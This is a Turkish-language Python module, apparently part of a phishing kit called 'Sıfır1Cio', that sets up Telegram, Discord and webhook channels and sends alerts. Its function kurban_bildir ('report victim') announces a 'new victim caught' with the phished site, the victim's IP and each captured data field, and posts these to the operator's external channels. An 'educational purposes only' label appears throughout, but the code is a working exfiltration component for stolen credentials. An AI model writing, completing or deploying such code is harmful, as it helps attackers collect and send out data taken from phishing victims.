# -*- coding: utf-8 -*-
# =============================================================================
# modules/notifier.py — Bildirim Sistemi
# =============================================================================
# KESİNLİKLE EĞİTİM AMAÇLIDIR
# =============================================================================
# Telegram, Discord ve webhook bildirimleri gönderir.
# =============================================================================

import os
import json
import time
from pathlib import Path
from typing import Optional, Dict, List

try:
    import requests
    _REQUESTS_VAR = True
except ImportError:
    _REQUESTS_VAR = False


class Bildirimci:
    """Telegram / Discord / Webhook bildirimleri."""

    def __init__(self, config_yolu: Optional[Path] = None):
        self.config_yolu = config_yolu or Path(__file__).parent.parent / "config.json"
        self.ayarlar = self._yukle()

    def _yukle(self) -> Dict:
        try:
            if self.config_yolu.exists():
                with open(self.config_yolu, "r", encoding="utf-8") as f:
                    data = json.load(f)
                return data.get("bildirim", {})
        except Exception:
            pass
        return {
            "telegram": {"aktif": False, "bot_token": "", "chat_id": ""},
            "discord": {"aktif": False, "webhook_url": ""},
            "webhook": {"aktif": False, "url": ""},
        }

    def _kaydet(self):
        try:
            data = {}
            if self.config_yolu.exists():
                with open(self.config_yolu, "r", encoding="utf-8") as f:
                    data = json.load(f)
            data["bildirim"] = self.ayarlar
            with open(self.config_yolu, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Bildirim ayarları kaydedilemedi: {e}")

    def telegram_ayarla(self, bot_token: str, chat_id: str):
        self.ayarlar.setdefault("telegram", {})
        self.ayarlar["telegram"]["bot_token"] = bot_token
        self.ayarlar["telegram"]["chat_id"] = chat_id
        self.ayarlar["telegram"]["aktif"] = True
        self._kaydet()

    def discord_ayarla(self, webhook_url: str):
        self.ayarlar.setdefault("discord", {})
        self.ayarlar["discord"]["webhook_url"] = webhook_url
        self.ayarlar["discord"]["aktif"] = True
        self._kaydet()

    def webhook_ayarla(self, url: str):
        self.ayarlar.setdefault("webhook", {})
        self.ayarlar["webhook"]["url"] = url
        self.ayarlar["webhook"]["aktif"] = True
        self._kaydet()

    def _telegram_gonder(self, mesaj: str) -> bool:
        if not _REQUESTS_VAR:
            return False
        ayar = self.ayarlar.get("telegram", {})
        if not ayar.get("aktif"):
            return False
        token = ayar.get("bot_token", "")
        chat = ayar.get("chat_id", "")
        if not token or not chat:
            return False
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            r = requests.post(url, json={
                "chat_id": chat,
                "text": mesaj,
                "parse_mode": "HTML",
            }, timeout=10)
            return r.status_code == 200
        except Exception as e:
            print(f"[!] Telegram hatası: {e}")
            return False

    def _discord_gonder(self, mesaj: str) -> bool:
        if not _REQUESTS_VAR:
            return False
        ayar = self.ayarlar.get("discord", {})
        if not ayar.get("aktif"):
            return False
        url = ayar.get("webhook_url", "")
        if not url:
            return False
        try:
            r = requests.post(url, json={"content": mesaj}, timeout=10)
            return r.status_code in (200, 204)
        except Exception as e:
            print(f"[!] Discord hatası: {e}")
            return False

    def _webhook_gonder(self, mesaj: str) -> bool:
        if not _REQUESTS_VAR:
            return False
        ayar = self.ayarlar.get("webhook", {})
        if not ayar.get("aktif"):
            return False
        url = ayar.get("url", "")
        if not url:
            return False
        try:
            r = requests.post(url, json={"text": mesaj, "zaman": time.time()}, timeout=10)
            return r.status_code < 400
        except Exception as e:
            print(f"[!] Webhook hatası: {e}")
            return False

    def gonder(self, mesaj: str) -> Dict[str, bool]:
        """Tüm aktif kanallara gönderir."""
        sonuc = {
            "telegram": self._telegram_gonder(mesaj),
            "discord": self._discord_gonder(mesaj),
            "webhook": self._webhook_gonder(mesaj),
        }
        return sonuc

    def kurban_bildir(self, site: str, ip: str, veriler: Dict) -> None:
        """Yeni kurban bildirimi."""
        satirlar = [
            "🎣 <b>Yeni Kurban Yakalandı!</b>",
            f"Site: <code>{site}</code>",
            f"IP: <code>{ip}</code>",
            f"Zaman: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            "--- Veriler ---",
        ]
        for k, v in veriler.items():
            satirlar.append(f"<b>{k}</b>: <code>{v}</code>")

        mesaj = "\n".join(satirlar)
        self.gonder(mesaj)

    def test_gonder(self) -> None:
        """Test bildirimi."""
        self.gonder("🔔 Sıfır1Cio test bildirimi\nKESİNLİKLE EĞİTİM AMAÇLIDIR")

    def durum(self) -> Dict:
        return {
            "telegram": self.ayarlar.get("telegram", {}).get("aktif", False),
            "discord": self.ayarlar.get("discord", {}).get("aktif", False),
            "webhook": self.ayarlar.get("webhook", {}).get("aktif", False),
        }


def bildirim_menusu():
    b = Bildirimci()
    while True:
        print()
        print("╔══════════════════════════════════════════════╗")
        print("║           Bildirim Ayarları                  ║")
        print("║           KESİNLİKLE EĞİTİM AMAÇLIDIR       ║")
        print("╚══════════════════════════════════════════════╝")
        print()

        durum = b.durum()
        tg = "✓" if durum["telegram"] else "✗"
        dc = "✓" if durum["discord"] else "✗"
        wh = "✓" if durum["webhook"] else "✗"

        print(f"  [1] Telegram ayarla     [{tg}]")
        print(f"  [2] Discord ayarla      [{dc}]")
        print(f"  [3] Webhook ayarla      [{wh}]")
        print(f"  [4] Test bildirimi gönder")
        print(f"  [0] Geri")
        print()

        try:
            s = input("Seçim: ").strip()
        except (EOFError, KeyboardInterrupt):
            return

        if s == "0":
            return
        elif s == "1":
            token = input("Bot token: ").strip()
            chat = input("Chat ID: ").strip()
            if token and chat:
                b.telegram_ayarla(token, chat)
                print("[+] Telegram ayarlandı.")
        elif s == "2":
            url = input("Webhook URL: ").strip()
            if url:
                b.discord_ayarla(url)
                print("[+] Discord ayarlandı.")
        elif s == "3":
            url = input("Webhook URL: ").strip()
            if url:
                b.webhook_ayarla(url)
                print("[+] Webhook ayarlandı.")
        elif s == "4":
            b.test_gonder()
            print("[+] Test gönderildi.")


if __name__ == "__main__":
    bildirim_menusu()
